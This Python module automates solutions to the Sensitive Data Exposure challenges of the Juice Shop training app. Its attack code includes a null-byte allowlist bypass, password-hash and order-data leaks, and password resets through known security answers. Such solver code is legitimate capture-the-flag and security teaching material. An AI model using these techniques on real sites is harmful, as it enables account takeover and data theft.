"""Sensitive Data Exposure category solvers (16 of 16). Verified against
routes/checkKeys.ts, routes/currentUser.ts, routes/dataExport.ts,
routes/fileServer.ts, routes/login.ts, routes/resetPassword.ts,
routes/verify.ts, data/datacreator.ts, data/static/users.yml, and
config/default.yml (fetched 2026-08-09)."""
import uuid

from eth_account import Account

from core.client import JuiceShopClient
from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"

Account.enable_unaudited_hdwallet_features()


# --- routes/checkKeys.ts: derives an Ethereum wallet from a hardcoded BIP39
# mnemonic via ethers' HDNodeWallet.fromPhrase(), which uses the default
# derivation path m/44'/60'/0'/0/0 — eth-account's Account.from_mnemonic()
# uses the identical default path, so it reproduces the exact same private
# key. Just needs the "0x" prefix ethers always includes. ---

NFT_MNEMONIC = "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch"


@register("nftUnlockChallenge", "Sensitive Data Exposure", 2)
def solve_nft_unlock(ctx: SolverContext) -> None:
    acct = Account.from_mnemonic(NFT_MNEMONIC)
    private_key = "0x" + acct.key.hex().removeprefix("0x")
    ctx.client.post("/rest/web3/submitKey", json={"privateKey": private_key}).raise_for_status()


# --- routes/currentUser.ts: GET /rest/user/whoami with ?fields=password
# returns the password hash in the response body (a field allowlist that
# doesn't exclude "password"); the same endpoint with any ?callback= param
# switches to JSONP, which unconditionally solves emailLeakChallenge. ---

@register("passwordHashLeakChallenge", "Sensitive Data Exposure", 2)
def solve_password_hash_leak(ctx: SolverContext) -> None:
    email = f"pwhash.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.get("/rest/user/whoami", params={"fields": "password"}).raise_for_status()


@register("emailLeakChallenge", "Sensitive Data Exposure", 5)
def solve_email_leak(ctx: SolverContext) -> None:
    ctx.client.get("/rest/user/whoami", params={"callback": "cb"}).raise_for_status()


# --- routes/fileServer.ts: files under /ftp are allowlisted to .md/.pdf (or
# the literal "incident-support.kdbx") *before* a poison-null-byte ("%00" as
# a literal 3-char substring, not a real NUL — cutOffPoisonNullByte does a
# plain string search) truncates the name. Appending "%2500.md" to a real
# filename passes the allowlist check as ".md", then truncates back to the
# real (non-.md) file. acquisitions.md itself needs no bypass — it's just
# not linked from the UI. ---

@register("directoryListingChallenge", "Sensitive Data Exposure", 1)
def solve_directory_listing(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/acquisitions.md").raise_for_status()


@register("forgottenDevBackupChallenge", "Sensitive Data Exposure", 4)
def solve_forgotten_dev_backup(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/package.json.bak%2500.md").raise_for_status()


@register("forgottenBackupChallenge", "Sensitive Data Exposure", 4)
def solve_forgotten_backup(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/coupons_2013.md.bak%2500.md").raise_for_status()


# --- routes/login.ts verifyPreLoginChallenges: these three fire purely on
# the request body matching a hardcoded email/password pair, regardless of
# whether the login itself succeeds. mc.safesearch and amy are real seeded
# users (data/static/users.yml); "testing" isn't seeded at all — irrelevant,
# since the challenge check runs before the DB lookup. ---

@register("loginRapperChallenge", "Sensitive Data Exposure", 2)
def solve_login_rapper(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"mc.safesearch@{DOMAIN}", "password": "Mr. N00dles"})


@register("loginAmyChallenge", "Sensitive Data Exposure", 3)
def solve_login_amy(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"amy@{DOMAIN}", "password": "K1f....................."})


@register("exposedCredentialsChallenge", "Sensitive Data Exposure", 2)
def solve_exposed_credentials(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"testing@{DOMAIN}", "password": "IamUsedForTesting"})


# --- routes/dataExport.ts: orders are looked up by the *masked* email
# (vowels replaced with '*'), the same masking routes/order.ts applies when
# storing an order's owner. Two accounts whose real emails mask to the same
# string (e.g. "0000####" vs "1111####" — no vowels in either, so nothing
# gets masked and they collide only if literally identical; using an
# all-consonant-and-digit shared suffix with an all-vowel prefix on one and
# no vowels on the other guarantees a collision without relying on random
# hex letters). Placing an order as one account then exporting data as the
# other leaks the first account's order (its orderId prefix — hash(email)
# truncated to 4 chars — won't match the exporter's own email hash). ---

@register("dataExportChallenge", "Sensitive Data Exposure", 4)
def solve_data_export(ctx: SolverContext) -> None:
    suffix = f"{uuid.uuid4().int % 100000000:08d}"  # digits only, no vowel ambiguity
    victim_email = f"aaaa{suffix}@{DOMAIN}"
    attacker_email = f"eeee{suffix}@{DOMAIN}"  # masks to the identical "****{suffix}@..."

    ctx.client.register(victim_email, "Test1234!")
    victim_login = ctx.client.login(victim_email, "Test1234!")
    victim_bid = victim_login.json()["authentication"]["bid"]
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.post("/api/BasketItems", json={"ProductId": product_id, "BasketId": victim_bid, "quantity": 1}).raise_for_status()
    ctx.client.post(f"/rest/basket/{victim_bid}/checkout").raise_for_status()

    attacker_client = JuiceShopClient(ctx.base_url)
    attacker_client.register(attacker_email, "Test1234!")
    attacker_client.login(attacker_email, "Test1234!")
    my_id = attacker_client.get("/rest/user/whoami").json()["user"]["id"]
    attacker_client.post("/rest/user/data-export", json={"UserId": my_id}).raise_for_status()


# --- routes/verify.ts databaseRelatedChallenges (mounted with app.use(),
# i.e. runs on *every* request): dlpPastebinDataLeakChallenge solves when a
# single Feedback or Complaint message contains ALL keywords from
# config.default.yml's one product with keywordsForPastebinDataLeakChallenge
# ("hueteroneel" and "eurogium edule"); leakedApiKeyChallenge solves the same
# way for one hardcoded fake API key substring. Both just need a POST to
# /api/Complaints (no captcha there, unlike /api/Feedbacks) containing the
# right text — checked on the *next* request after submission. ---

@register("dlpPastebinDataLeakChallenge", "Sensitive Data Exposure", 4)
def solve_dlp_pastebin_leak(ctx: SolverContext) -> None:
    email = f"dlp.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/api/Complaints",
        json={"message": "Product contains hueteroneel and eurogium edule, unsafe!"},
    ).raise_for_status()


@register("leakedApiKeyChallenge", "Sensitive Data Exposure", 5)
def solve_leaked_api_key(ctx: SolverContext) -> None:
    email = f"apikey.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/api/Complaints",
        json={"message": "Found a leaked key: 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie in our repo!"},
    ).raise_for_status()


# --- routes/verify.ts accessControlChallenges, mounted on
# /assets/public/images/products: solved the instant a request for the
# blueprint file arrives that wasn't triggered by the actual UI (no
# `referer` header — true by default for a plain HTTP client). The filename
# itself (JuiceShop.stl) comes from config.default.yml's one product with
# fileForRetrieveBlueprintChallenge. ---

@register("retrieveBlueprintChallenge", "Sensitive Data Exposure", 5)
def solve_retrieve_blueprint(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/products/JuiceShop.stl").raise_for_status()


# --- routes/resetPassword.ts verifySecurityAnswerChallenges: real seeded
# security-question answer for uvogin (data/static/users.yml). ---

@register("resetPasswordUvoginChallenge", "Sensitive Data Exposure", 4)
def solve_reset_password_uvogin(ctx: SolverContext) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": f"uvogin@{DOMAIN}", "answer": "Silence of the Lambs", "new": "NewUvoginPassword1!", "repeat": "NewUvoginPassword1!"},
    ).raise_for_status()


# --- routes/resetPassword.ts verifySecurityAnswerChallenges: these two
# don't check a per-user security-question answer at all — they check
# against config.default.yml's memories[].geoStalkingMetaSecurityAnswer /
# geoStalkingVisualSecurityAnswer ("Daniel Boone National Forest" and
# "ITsec" under the default config profile), for John and Emma respectively. ---

@register("geoStalkingMetaChallenge", "Sensitive Data Exposure", 2)
def solve_geo_stalking_meta(ctx: SolverContext) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": f"john@{DOMAIN}", "answer": "Daniel Boone National Forest", "new": "NewJohnPassword1!", "repeat": "NewJohnPassword1!"},
    ).raise_for_status()


@register("geoStalkingVisualChallenge", "Sensitive Data Exposure", 2)
def solve_geo_stalking_visual(ctx: SolverContext) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": f"emma@{DOMAIN}", "answer": "ITsec", "new": "NewEmmaPassword1!", "repeat": "NewEmmaPassword1!"},
    ).raise_for_status()
